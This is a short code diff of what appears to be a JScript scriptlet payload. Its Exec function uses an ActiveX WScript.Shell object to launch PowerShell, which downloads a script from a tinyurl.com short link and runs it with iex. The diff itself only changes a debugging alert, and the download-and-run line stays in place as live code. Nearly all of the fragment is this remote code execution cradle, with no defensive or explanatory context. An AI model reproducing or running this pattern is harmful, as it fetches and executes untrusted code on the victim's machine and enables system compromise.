@@ -11,7 +11,7 @@
 	function Exec()
 	{
 		var r = new ActiveXObject("WScript.Shell").Run('powershell -c "iex (new-object net.webclient).DownloadString(\"https://tinyurl.com/ebaatuju\")');
-    window.alert(r);
+    window.alert("hello");
 	}
 
 ]]>
